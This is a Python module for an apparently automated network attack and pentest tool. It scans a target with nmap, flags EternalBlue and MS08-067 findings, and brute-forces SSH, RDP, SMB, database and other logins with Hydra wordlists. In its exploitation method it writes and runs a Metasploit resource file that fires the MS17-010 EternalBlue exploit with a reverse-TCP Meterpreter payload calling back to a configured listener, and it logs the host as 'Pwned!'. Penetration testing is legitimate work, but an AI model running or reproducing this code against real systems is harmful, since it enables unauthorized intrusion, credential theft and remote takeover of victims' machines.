import os
import logging
import xml.etree.ElementTree as ET
from scanner_utils import run_command
from config import (
    NMAP_DEFAULT_SCAN_TYPES, NMAP_NETWORK_SCRIPTS, NMAP_FULL_PORT_SCAN_OPTIONS,
    HYDRA_USER_LISTS, HYDRA_WORD_LISTS, HYDRA_SERVICES,
    ENABLE_AUTO_EXPLOIT, MSF_LHOST, MSF_LPORT
)

class NetworkScanner:
    def __init__(self, target_ip, target_dir):
        self.target_ip = target_ip
        self.target_dir = target_dir
        os.makedirs(self.target_dir, exist_ok=True)
        self.open_ports = {} # {port: service_name}
        self.vulnerabilities = [] # To store discovered vulnerabilities/findings
        self.credentials = [] # To store found credentials

    def _parse_nmap_xml(self, xml_file):
        """
        Parses Nmap XML output to extract open ports and service information.
        Also attempts to extract basic vulnerability findings from script output.
        """
        if not os.path.exists(xml_file):
            logging.warning(f"[-] Nmap XML file not found: {xml_file}")
            return

        try:
            tree = ET.parse(xml_file)
            root = tree.getroot()

            for host in root.findall('host'):
                if host.find('address').attrib['addr'] == self.target_ip:
                    for port_elem in host.findall('./ports/port'):
                        if port_elem.find('state').attrib['state'] == 'open':
                            port_id = port_elem.attrib['portid']
                            service_name = port_elem.find('service').attrib.get('name', 'unknown')
                            self.open_ports[port_id] = service_name
                            
                            # Check for script output within the port element
                            for script_elem in port_elem.findall('script'):
                                script_id = script_elem.attrib['id']
                                script_output = script_elem.attrib['output']
                                
                                # Basic parsing for common vulnerability indicators
                                if "smb-vuln-ms17-010" in script_id and "VULNERABLE" in script_output:
                                    self.vulnerabilities.append({
                                        'type': 'SMB Vulnerability',
                                        'name': 'MS17-010 (EternalBlue)',
                                        'target': self.target_ip,
                                        'severity': 'Critical',
                                        'details': script_output,
                                        'source_file': xml_file
                                    })
                                elif "smb-vuln-ms08-067" in script_id and "VULNERABLE" in script_output:
                                    self.vulnerabilities.append({
                                        'type': 'SMB Vulnerability',
                                        'name': 'MS08-067 (Conficker)',
                                        'target': self.target_ip,
                                        'severity': 'Critical',
                                        'details': script_output,
                                        'source_file': xml_file
                                    })
                                # Add more specific NSE script parsing here as needed
                                elif "vulners" in script_id or "vulscan" in script_id:
                                    # This is general; you'd need more specific parsing for real details
                                    if "CVE-" in script_output or "VULNERABLE" in script_output.upper():
                                        self.vulnerabilities.append({
                                            'type': 'Generic Service Vulnerability',
                                            'name': f'Nmap Vuln Script Output for {service_name}',
                                            'target': self.target_ip,
                                            'severity': 'Unknown/Review', # Needs manual review
                                            'details': script_output,
                                            'source_file': xml_file
                                        })
                    break # Found the target host

        except ET.ParseError as e:
            logging.error(f"[-] Error parsing Nmap XML for {self.target_ip} (malformed XML?): {e}")
        except Exception as e:
            logging.error(f"[-] An unexpected error occurred while parsing Nmap XML for {self.target_ip}: {e}")

    def nmap_scan(self):
        logging.info(f"[*] Running Nmap default scan on {self.target_ip}...")
        output_file_base = os.path.join(self.target_dir, f"{self.target_ip}_nmap_default")
        command = ["nmap", *NMAP_DEFAULT_SCAN_TYPES.split(), "--script", NMAP_NETWORK_SCRIPTS, "-oA", output_file_base, self.target_ip]
        if run_command(command, f"{output_file_base}.log", "Nmap Default Scan"):
            self._parse_nmap_xml(f"{output_file_base}.xml")

        logging.info(f"[*] Running Nmap full port scan on {self.target_ip}...")
        output_file_full = os.path.join(self.target_dir, f"{self.target_ip}_nmap_full")
        command_full = ["nmap", *NMAP_FULL_PORT_SCAN_OPTIONS.split(), "-oA", output_file_full, self.target_ip]
        if run_command(command_full, f"{output_file_full}.log", "Nmap Full Port Scan"):
            self._parse_nmap_xml(f"{output_file_full}.xml") # Re-parse to catch any new ports

    def brute_force(self):
        logging.info(f"[*] Attempting brute-force on common services for {self.target_ip}...")
        
        # Mapping common service names to their typical ports for Hydra
        service_port_map = {
            "ftp": "21",
            "ssh": "22",
            "telnet": "23",
            "smb": "445",
            "pop3": "110",
            "imap": "143",
            "vnc": "5900",
            "rdp": "3389",
            "mssql": "1433",
            "mysql": "3306",
            "postgres": "5432"
        }

        for service_name in HYDRA_SERVICES:
            # Check if Nmap found this service open on its typical port
            target_port = service_port_map.get(service_name)
            if target_port and target_port in self.open_ports and self.open_ports[target_port] == service_name:
                output_file = os.path.join(self.target_dir, f"{self.target_ip}_{service_name}_hydra.txt")
                
                logging.info(f"    Attempting Hydra on {service_name.upper()} ({self.target_ip}:{target_port})...")
                
                # Hydra command construction
                # This is a basic example using the first wordlist from each list.
                # For more robust use, you might loop through all wordlists or combine them.
                hydra_command = ["hydra", "-L", HYDRA_USER_LISTS[0], "-P", HYDRA_WORD_LISTS[0], 
                                 f"{self.target_ip}", service_name, "-o", output_file]
                
                # Some services might require specific modules or syntax
                if service_name == "smb":
                    hydra_command = ["hydra", "-L", HYDRA_USER_LISTS[0], "-P", HYDRA_WORD_LISTS[0], 
                                     f"{self.target_ip}", "smb", "-o", output_file]
                elif service_name in ["http-get", "https-get"]:
                    # Removed web app specific brute-force for HTTP/S based on user request.
                    # This would involve login forms etc., which are web app specific.
                    logging.info(f"    Skipping HTTP/S brute-force as focus is not web applications.")
                    continue

                if run_command(hydra_command, output_file, f"Hydra {service_name} Brute-force"):
                    # Check for found credentials
                    if os.path.exists(output_file) and os.path.getsize(output_file) > 0:
                        with open(output_file, 'r') as f:
                            for line in f:
                                # Hydra's output format can vary, look for common indicators
                                if "login:" in line and "password:" in line or "Host:" in line and "Login:" in line and "Password:" in line:
                                    self.credentials.append({
                                        'service': service_name,
                                        'target': self.target_ip,
                                        'details': line.strip()
                                    })
                                    self.vulnerabilities.append({
                                        'type': 'Weak Credentials',
                                        'name': f'{service_name} Brute-force Success',
                                        'target': self.target_ip,
                                        'severity': 'High',
                                        'details': line.strip()
                                    })
            else:
                logging.debug(f"    {service_name.upper()} port ({target_port}) not found open or not in target services list. Skipping.")


    def exploitation_attempts(self):
        if not ENABLE_AUTO_EXPLOIT:
            logging.info("[-] Automatic exploitation is disabled. Skipping exploitation attempts.")
            return

        logging.info(f"[*] Analyzing findings for potential automated exploitation on {self.target_ip}...")

        # Loop through identified vulnerabilities and attempt to exploit if criteria match
        for vuln in self.vulnerabilities:
            if vuln['name'] == 'MS17-010 (EternalBlue)' and vuln['severity'] == 'Critical':
                logging.warning(f"[!!!] Attempting automated MS17-010 exploitation on {self.target_ip} (CRITICAL RISK!)...")
                exploit_log_file = os.path.join(self.target_dir, f"{self.target_ip}_ms17-010_exploit.log")
                
                msf_resource_file = os.path.join(self.target_dir, f"{self.target_ip}_ms17-010.rc")
                with open(msf_resource_file, 'w') as f:
                    f.write("use exploit/windows/smb/ms17_010_eternalblue\n")
                    f.write(f"set RHOSTS {self.target_ip}\n")
                    f.write(f"set PAYLOAD windows/x64/meterpreter/reverse_tcp\n") # Or windows/meterpreter/reverse_tcp for 32-bit
                    f.write(f"set LHOST {MSF_LHOST}\n")
                    f.write(f"set LPORT {MSF_LPORT}\n")
                    f.write("exploit -j\n") # Run in background
                    f.write("exit -y\n") # Exit msfconsole after launching

                # Ensure msfconsole is available
                if not run_command(["msfconsole", "-r", msf_resource_file, "-q"], exploit_log_file, f"MS17-010 Exploitation on {self.target_ip}"):
                    logging.error(f"[-] MS17-010 exploitation attempt failed for {self.target_ip}. Check {exploit_log_file}")
                else:
                    # In a real tool, you'd have a listener and check for sessions.
                    # For this script, we just assume success if msfconsole runs without error and logs a session.
                    # You MUST manually check your listener in Metasploit.
                    logging.critical(f"[!!!] Potential Meterpreter session launched for {self.target_ip}. Check your Metasploit listeners on {MSF_LHOST}:{MSF_LPORT}!")
                    self.vulnerabilities.append({'type': 'Exploitation Success', 'name': 'MS17-010 Metasploit', 'target': self.target_ip, 'severity': 'Pwned!', 'details': f"Metasploit resource file: {msf_resource_file}, Log: {exploit_log_file}"})
                break # Only attempt one exploit per target for now.

            # Add more automated exploitation logic based on other identified vulnerabilities
            # Example: If SSH login found, attempt to execute commands (very high risk)
            # This would require more sophisticated logic and usually custom Python modules.

    def run_all_scans(self):
        logging.info(f"--- Starting scans for target: {self.target_ip} ---")
        self.nmap_scan()
        self.brute_force()
        self.exploitation_attempts()
        logging.info(f"--- Finished scans for target: {self.target_ip} ---")
        return {
            'target': self.target_ip,
            'open_ports': self.open_ports,
            'vulnerabilities': self.vulnerabilities,
            'credentials': self.credentials,
            'output_dir': self.target_dir
        }
